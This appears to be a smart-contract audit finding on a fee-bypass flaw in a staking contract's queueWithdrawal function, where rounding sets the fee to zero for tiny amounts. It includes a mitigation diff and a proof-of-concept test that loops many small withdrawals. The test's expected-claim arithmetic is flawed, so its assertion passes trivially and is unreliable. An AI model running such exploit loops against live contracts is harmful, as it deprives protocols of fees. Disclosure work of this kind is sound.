  "body": "# A User Can Withdraw Tiny Amounts to Bypass Fees\n\n## Finding Description and Impact\n\nIn the function `StakingManager::queueWithdrawal`, if a user passes an amount such that `amount * unstakeFeeRate < BASIS_POINTS`, the `kHYPEFee` is set to `0`:\n\n```solidity\nuint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n```\n\nThis allows a user to bypass fees by withdrawing their stake in very small increments.\n\n- **Likelihood**: Low – This vulnerability is unlikely to be exploited at scale, as the gas cost would exceed the value of the avoided fees.  \n- **Impact**: High – Potential loss of protocol fees.\n\n## Recommended Mitigation\n\nTo fix this issue, it is recommended to introduce a minimum withdrawal amount in the `StakingManager::queueWithdrawal` function:\n\n```diff\nfunction queueWithdrawal(uint256 kHYPEAmount) external nonReentrant whenNotPaused whenWithdrawalNotPaused {\n    // Check whitelist if enabled\n    if (whitelistEnabled) {\n        require(isWhitelisted(msg.sender), \"Address not whitelisted\");\n    }\n\n-   require(kHYPEAmount > 0, \"Invalid amount\");\n+   require(kHYPEAmount > MIN_WITHDRAWAL, \"Invalid amount\");\n    require(kHYPE.balanceOf(msg.sender) >= kHYPEAmount, \"Insufficient kHYPE balance\");\n\n    uint256 withdrawalId = nextWithdrawalId[msg.sender];\n\n    // Calculate fee in kHYPE using mulDiv for precision\n    uint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n    uint256 postFeeKHYPE = kHYPEAmount - kHYPEFee;\n\n    // Convert post-fee kHYPE to HYPE using StakingAccountant\n    uint256 hypeAmount = stakingAccountant.kHYPEToHYPE(postFeeKHYPE);\n\n    // Lock kHYPE tokens\n    kHYPE.transferFrom(msg.sender, address(this), kHYPEAmount);\n\n    // Create withdrawal request\n    _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest({\n        hypeAmount: hypeAmount,\n        kHYPEAmount: postFeeKHYPE,\n        kHYPEFee: kHYPEFee,\n        timestamp: block.timestamp\n    });\n\n    nextWithdrawalId[msg.sender]++;\n    totalQueuedWithdrawals += hypeAmount;\n\n    // Withdraw from current delegation\n    address currentDelegation = validatorManager.getDelegation(address(this));\n    require(currentDelegation != address(0), \"No delegation set\");\n    _withdrawFromValidator(currentDelegation, hypeAmount, OperationType.UserWithdrawal);\n\n    emit WithdrawalQueued(address(this), msg.sender, withdrawalId, kHYPEAmount, hypeAmount, kHYPEFee);\n}\n```",
  "proof_of_concept": "## Proof of Concept\n\nAdd the following test to `StakingManager.t.sol`:\n\n```javascript\nfunction test_QueueWithdrawal_BypassFee() public {\n    // Setup initial stake and withdrawal\n    uint256 stakeAmount = 1 ether;\n\n    vm.startPrank(manager);\n    validatorManager.activateValidator(validator);\n    validatorManager.setDelegation(address(stakingManager), validator);\n    vm.stopPrank();\n\n    vm.deal(user, stakeAmount);\n    vm.prank(user);\n    stakingManager.stake{value: stakeAmount}();\n\n    // Approve and queue withdrawal\n    vm.startPrank(user);\n    kHYPE.approve(address(stakingManager), stakeAmount);\n\n    // Unstake just enough to bypass fees (999 * 10 < 10000)\n    uint unstakeAmount = 999;\n    uint nbSlices = 1000;\n\n    // Store withdrawal IDs for batch confirmation\n    uint256[] memory withdrawalIds = new uint[](nbSlices);\n\n    for (uint i = 0; i < nbSlices; i++) {\n        stakingManager.queueWithdrawal(unstakeAmount);\n        withdrawalIds[i] = i;\n    }\n\n    vm.stopPrank();\n\n    // Add ETH to the contract to process withdrawals\n    vm.deal(address(stakingManager), stakeAmount);\n\n    // Set withdrawal delay to 0 to allow immediate confirmation\n    vm.prank(manager);\n    stakingManager.setWithdrawalDelay(0);\n\n    // Confirm withdrawals\n    vm.prank(user);\n    vm.expectEmit(true, true, true, true);\n    stakingManager.batchConfirmWithdrawals(withdrawalIds);\n\n    // The total amount unstaked\n    uint effectiveUnstakeAmount = unstakeAmount * nbSlices;\n\n    // Calculate expected fee\n    uint256 feeRate = stakingManager.unstakeFeeRate();\n    uint256 expectedFee = (effectiveUnstakeAmount * feeRate) / stakingManager.BASIS_POINTS();\n    uint256 expectedClaimedAmount = (effectiveUnstakeAmount - expectedFee) * nbSlices;\n\n    console.log(\"Expected Claim:\", expectedClaimedAmount);\n    console.log(\"Claimed Amount:\", stakingManager.totalClaimed());\n\n    assertEq(stakingManager.totalQueuedWithdrawals(), 0);\n    assertLt(stakingManager.totalClaimed(), expectedClaimedAmount, \"Total claimed should account for fee\");\n}\n```\n\nTest output:\n\n```\nExpected Claim: 998001000\nClaimed Amount: 999000\n```",
